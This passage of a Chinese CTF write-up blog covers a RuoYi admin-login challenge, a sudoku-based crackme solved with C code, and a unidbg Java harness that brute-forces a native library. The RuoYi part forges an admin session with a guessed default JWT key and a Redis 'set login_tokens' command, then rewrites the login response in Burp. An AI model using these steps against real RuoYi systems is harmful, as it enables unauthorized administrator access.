&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>猜测 JWT 的密钥为默认密钥，可以伪造 Admin-Token 登录，直接上演示地址获取一下：<a href="http://vue.ruoyi.vip/index" target="_blank" rel="noopener">http://vue.ruoyi.vip/index</a></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599598820/0" alt=""></p><p>JWTdecode</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599004/0" alt=""></p><p>然后 set 一个新的 login_tokens：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set login_tokens:20c5d147-ca80-41ea-94cb-726c7b6c8b67 &quot;&#123;\&quot;@type\&quot;:\&quot;com.ruoyi.common.core.domain.model.LoginUser\&quot;,\&quot;accountNonExpired\&quot;:true,\&quot;accountNonLocked\&quot;:true,\&quot;browser\&quot;:\&quot;Chrome 9\&quot;,\&quot;credentialsNonExpired\&quot;:true,\&quot;enabled\&quot;:true,\&quot;expireTime\&quot;:1690354819542,\&quot;ipaddr\&quot;:\&quot;117.175.182.182\&quot;,\&quot;loginLocation\&quot;:\&quot;XX XX\&quot;,\&quot;loginTime\&quot;:1620354879542,\&quot;os\&quot;:\&quot;Windows 10\&quot;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;permissions\&quot;:Set[\&quot;*:*:*\&quot;],\&quot;token\&quot;:\&quot;20c5d147-ca80-41ea-94cb-726c7b6c8b67\&quot;,\&quot;user\&quot;:&#123;\&quot;admin\&quot;:true,\&quot;avatar\&quot;:\&quot;\&quot;,\&quot;createBy\&quot;:\&quot;admin\&quot;,\&quot;createTime\&quot;:1620186031000,\&quot;delFlag\&quot;:\&quot;0\&quot;,\&quot;dept\&quot;:&#123;\&quot;children\&quot;:[],\&quot;deptId\&quot;:103,\&quot;deptName\&quot;:\&quot;\xe7\xa0\x94\xe5\x8f\x91\xe9\x83\xa8\xe9\x97\xa8\&quot;,\&quot;leader\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;orderNum\&quot;:\&quot;1\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;parentId\&quot;:101,\&quot;status\&quot;:\&quot;0\&quot;&#125;,\&quot;deptId\&quot;:103,\&quot;email\&quot;:\&quot;ry@163.com\&quot;,\&quot;loginDate\&quot;:1620186031000,\&quot;loginIp\&quot;:\&quot;127.0.0.1\&quot;,\&quot;nickName\&quot;:\&quot;\xe8\x8b\xa5\xe4\xbe\x9d\&quot;,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;password\&quot;:\&quot;$2a$10$TbIq6QkLbP4MrjPaOJ2Y4.UqYYyChFC0HYrC7etAPI9iL1GOJ6ZLG\&quot;,\&quot;phonenumber\&quot;:\&quot;15888888888\&quot;,\&quot;remark\&quot;:\&quot;\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roles\&quot;:[&#123;\&quot;admin\&quot;:true,\&quot;dataScope\&quot;:\&quot;1\&quot;,\&quot;deptCheckStrictly\&quot;:false,\&quot;flag\&quot;:false,\&quot;menuCheckStrictly\&quot;:false,\&quot;params\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.util.HashMap\&quot;&#125;,\&quot;roleId\&quot;:1,\&quot;roleKey\&quot;:\&quot;admin\&quot;,\&quot;roleName\&quot;:\&quot;\xe8\xb6\x85\xe7\xba\xa7\xe7\xae\xa1\xe7\x90\x86\xe5\x91\x98\&quot;,\&quot;roleSort\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;&#125;],\&quot;sex\&quot;:\&quot;1\&quot;,\&quot;status\&quot;:\&quot;0\&quot;,\&quot;userId\&quot;:1,\&quot;userName\&quot;:\&quot;admin\&quot;&#125;,\&quot;username\&quot;:\&quot;admin\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure><p>BP 改一下 response:</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599172/0" alt=""></p><p>原来的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;用户不存在&#x2F;密码错误&quot;,&quot;code&quot;:500&#125;</span><br></pre></td></tr></table></figure><p>直接改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;登录成功&quot;,&quot;code&quot;:200,&quot;token&quot;:&quot;eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjIwYzVkMTQ3LWNhODAtNDFlYS05NGNiLTcyNmM3YjZjOGI2NyJ9.MgnwzkItWS6VMr-iw-TrxVmT0JSbAOIF6eOuQP_x_-JSenAIs0KXJn5kEfUU-NTuMQN1vDWfVdcZfetO4QXQCQ&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599320/0" alt=""></p><h2 id="第四题-英雄救美"><a href="#第四题-英雄救美" class="headerlink" title="第四题 英雄救美"></a>第四题 英雄救美</h2><p>一丢进 IDA 可以发现符号表 暗示着这题有点难</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599386/0" alt=""></p><p>猜测 sub_401240 和 sub_401000 为两个 check 函数</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599479/0" alt=""></p><p>想要继续往下走 也就是 sub_401240 和 sub_401000 返回值都要为 1</p><p>先分析分析前面那个</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599563/0" alt=""></p><p>可以看出这是一个 fill 函数</p><p>所做的只是将输入转换为在 table 中的 index</p><p>并提供给下一个 check 函数使用</p><p>值得注意的是传给 check 函数的参数</p><blockquote><p>if ( len &lt;= 64 &amp;&amp; fill(len, input, v10) == 1 &amp;&amp; check(v10, len - 9) == 1 )</p></blockquote><p>len 少了 9</p><p>意味着有 9 位输入被截取掉了</p><p>而再仔细回头看 fill 函数可以发现</p><p>若输入的是数字 并不会储存起来</p><p>而是跳过并且更改所比较的 table 的起始 index</p><p>再看看 check 函数</p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599684/0"  /><p>着一大部分都是将 fill 的结果填入一个表中 若被填的那一位为0 则填入</p><p>按照一个循环里9次判断,总共9次循环 将map划分为这样</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599790/0" alt=""></p><p>按照经验来看的话很像是数独 用在线网站解一下</p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599897/0" alt="image-20210525154624787" style="zoom: 80%;" /><p>正好有解 应该还是唯一解</p><p>那这就出了撒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> table[] = &#123; <span class="number">0x24</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0x56</span>, <span class="number">0x3A</span>, <span class="number">0x75</span>, <span class="number">0x62</span>, <span class="number">0x66</span>, <span class="number">0x59</span>, <span class="number">0x70</span>, <span class="number">0x7D</span>, <span class="number">0x5D</span>, <span class="number">0x44</span>, <span class="number">0x74</span>, <span class="number">0x4E</span>, <span class="number">0x3E</span>, <span class="number">0x61</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x4D</span>, <span class="number">0x47</span>, <span class="number">0x6D</span>, <span class="number">0x4A</span>, <span class="number">0x51</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x48</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x4F</span>, <span class="number">0x27</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x30</span>, <span class="number">0x21</span>, <span class="number">0x68</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x6F</span>, <span class="number">0x5A</span>, <span class="number">0x7A</span>, <span class="number">0x2D</span>, <span class="number">0x40</span>, <span class="number">0x6E</span>, <span class="number">0x2B</span>, <span class="number">0x3F</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x2F</span>, <span class="number">0x67</span>, <span class="number">0x3C</span>, <span class="number">0x65</span>, <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x29</span>, <span class="number">0x58</span>, <span class="number">0x55</span>, <span class="number">0x78</span>, <span class="number">0x52</span>, <span class="number">0x46</span>, <span class="number">0x53</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x3B</span>, <span class="number">0x2E</span>, <span class="number">0x6C</span>, <span class="number">0x3D</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>, <span class="number">0x4B</span>, <span class="number">0x2D</span>, <span class="number">0x28</span>, <span class="number">0x71</span>&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* path = <span class="string">"5619238\n18345\n76219\n7846925\n4539786\n6928713\n28563\n61728\n1793452\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; path[i]; ++i)</span><br><span class="line"><span class="keyword">if</span> (path[i] != <span class="string">'\n'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, table[ y * <span class="number">9</span> + path[i] - <span class="string">'0'</span> - <span class="number">1</span> ]);</span><br><span class="line">x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, <span class="number">9</span> - x);</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证成功</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13599599979/0" alt=""></p><blockquote><p>:u$YBPf2pa]Dt4#QM^H4ic’j0`w2y{d-Zzo2%/n_s@+2&lt;UW)e4AR;F.4=-qEkvC2</p></blockquote><h2 id="第五题-华山论剑"><a href="#第五题-华山论剑" class="headerlink" title="第五题 华山论剑"></a>第五题 华山论剑</h2><p>unidbg trace so文件的 java 工程代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kanxue.testbase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> capstone.Capstone;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.AndroidEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Emulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Module;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Symbol;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.ARM;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.HookStatus;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.context.Arm32RegisterContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.context.RegisterContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.debugger.DebuggerType;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.HookContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.ReplaceCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.Dobby;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.HookEntryInfo;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.HookZz;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.IHookZz;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.InstrumentCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.WrapCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.xhook.IxHook;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidARMEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.XHookImpl;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.DalvikModule;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.DvmClass;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.DvmObject;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.VM;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.array.ByteArray;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.StringObject;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.AbstractJni;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.listener.TraceCodeListener;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.memory.Memory;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.utils.Inspector;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Pointer;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.backend.CodeHook;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.backend.Backend;</span><br><span class="line"><span class="keyword">import</span> unicorn.ArmConst;</span><br><span class="line"><span class="keyword">import</span> unicorn.Unicorn;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AbstractJni</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MainActivity mainActivity = <span class="keyword">new</span> MainActivity();</span><br><span class="line">        mainActivity.stringFromJNI();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;</span><br><span class="line">    <span class="keyword">private</span> DvmClass cNative;</span><br><span class="line">    DalvikModule dm;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        emulator = <span class="keyword">new</span> AndroidARMEmulator(<span class="string">"aa"</span>);</span><br><span class="line">        Memory memory = emulator.getMemory();</span><br><span class="line">        <span class="comment">// 设置 sdk版本 23</span></span><br><span class="line">        <span class="comment">//LibraryResolver resolver = ;</span></span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> AndroidResolver(<span class="number">23</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建DalvikVM，可以载入apk，也可以为null</span></span><br><span class="line">        vm = emulator.createDalvikVM(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 是否打印日志</span></span><br><span class="line">        vm.setVerbose(<span class="keyword">false</span>);</span><br><span class="line">        vm.setJni(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//vm.setDvmClassFactory(new ProxyClassFactory());</span></span><br><span class="line">        <span class="comment">// System.out.println(getPath());</span></span><br><span class="line">        <span class="comment">// 载入要执行的 so</span></span><br><span class="line">         dm = vm.loadLibrary(<span class="keyword">new</span> File(getPath() + <span class="string">"/kanxue/libhello-jni.so"</span>), <span class="keyword">false</span>);</span><br><span class="line">        dm.callJNI_OnLoad(emulator);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">stringFromJNI</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Jni调用的类</span></span><br><span class="line">        cNative = vm.resolveClass(<span class="string">"com/example/hellojni/HelloJni"</span>);</span><br><span class="line">        <span class="keyword">final</span> StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//        Module module = dm.getModule();</span></span><br><span class="line"><span class="comment">//        emulator.traceCode(module.base, module.base + module.size, new TraceCodeListener() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void onInstruction(Emulator&lt;?&gt; emulator, long address, Capstone.CsInsn insn) &#123;</span></span><br><span class="line"><span class="comment">//                StringBuilder sb = new StringBuilder();</span></span><br><span class="line"><span class="comment">//                sb.append("==== Trace");</span></span><br><span class="line"><span class="comment">//                sb.append(ARM.assembleDetail(emulator, insn, address, false));</span></span><br><span class="line"><span class="comment">//                sb.append('\n');</span></span><br><span class="line"><span class="comment">//                //sb.append(emulator.getBackend().reg_read(1).toString());</span></span><br><span class="line"><span class="comment">//                //emulator.getContext().</span></span><br><span class="line"><span class="comment">//                String i0  = String.format("R0=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R0 ).intValue());</span></span><br><span class="line"><span class="comment">//                String i1  = String.format("R1=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R1 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i2  = String.format("R2=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R2 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i3  = String.format("R3=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R3 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i4  = String.format("R4=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R4 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i5  = String.format("R5=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R5 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i6  = String.format("R6=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R6 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i7  = String.format("R7=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R7 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i8  = String.format("R8=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R8 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i9  = String.format("R9=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R9 ).intValue());;</span></span><br><span class="line"><span class="comment">//                String i10 = String.format("R10=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R10).intValue());;</span></span><br><span class="line"><span class="comment">//                String i11 = String.format("R11=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R11).intValue());;</span></span><br><span class="line"><span class="comment">//                String i12 = String.format("R12=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_R12).intValue());;</span></span><br><span class="line"><span class="comment">//                String i13 = String.format("SP=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_SP).intValue());;</span></span><br><span class="line"><span class="comment">//                String i14 = String.format("LR=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_LR).intValue());;</span></span><br><span class="line"><span class="comment">//                String i15 = String.format("PC=%08X", emulator.getBackend().reg_read(ArmConst.UC_ARM_REG_PC).intValue());;</span></span><br><span class="line"><span class="comment">//                sb.append(</span></span><br><span class="line"><span class="comment">//                        i0 +" "+</span></span><br><span class="line"><span class="comment">//                        i1 +" "+</span></span><br><span class="line"><span class="comment">//                        i2 +" "+</span></span><br><span class="line"><span class="comment">//                        i3 +" "+</span></span><br><span class="line"><span class="comment">//                        i4 +" "+</span></span><br><span class="line"><span class="comment">//                        i5 +" "+</span></span><br><span class="line"><span class="comment">//                        i6 +" "+</span></span><br><span class="line"><span class="comment">//                        i7 +" "+</span></span><br><span class="line"><span class="comment">//                        i8 +" "+</span></span><br><span class="line"><span class="comment">//                        i9 +" "+</span></span><br><span class="line"><span class="comment">//                        i10+" "+</span></span><br><span class="line"><span class="comment">//                        i11+" "+</span></span><br><span class="line"><span class="comment">//                        i12+" "+</span></span><br><span class="line"><span class="comment">//                        i13+" "+</span></span><br><span class="line"><span class="comment">//                        i14+" "+</span></span><br><span class="line"><span class="comment">//                        i15</span></span><br><span class="line"><span class="comment">//                );</span></span><br><span class="line"><span class="comment">//                //emulator.getBackend().mem_read()</span></span><br><span class="line"><span class="comment">//                sb.append('\n');</span></span><br><span class="line"><span class="comment">//                stringBuilder.append(sb.toString());</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        StringObject strRc;</span><br><span class="line"></span><br><span class="line">        String[] hexs=&#123;<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>&#125;;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">24</span>;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> rd = (<span class="keyword">int</span>)(Math.random() * <span class="number">16</span>);</span><br><span class="line">                sb.append(hexs[rd]);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            System.out.println(sb.toString());</span></span><br><span class="line">            strRc = cNative.callStaticJniMethodObject(</span><br><span class="line">                    emulator,</span><br><span class="line">                    <span class="string">"stringFromJNI(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;"</span>,</span><br><span class="line">                    <span class="keyword">new</span> StringObject(vm, <span class="string">"KCTF"</span>),</span><br><span class="line">                    <span class="keyword">new</span> StringObject(vm, sb.toString())</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"><span class="comment">//            System.out.println("call stringFromJNI rc = " + strRc.getValue());</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!strRc.getValue().equals(<span class="string">"输入错误"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.println(<span class="string">"恭喜成功:"</span> + sb.toString());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//EncryptUtilsJni encryptUtilsJni = new EncryptUtilsJni(soFilePath, classPath);</span></span><br><span class="line">        <span class="comment">//// 输出getGameKey方法调用结果</span></span><br><span class="line">        <span 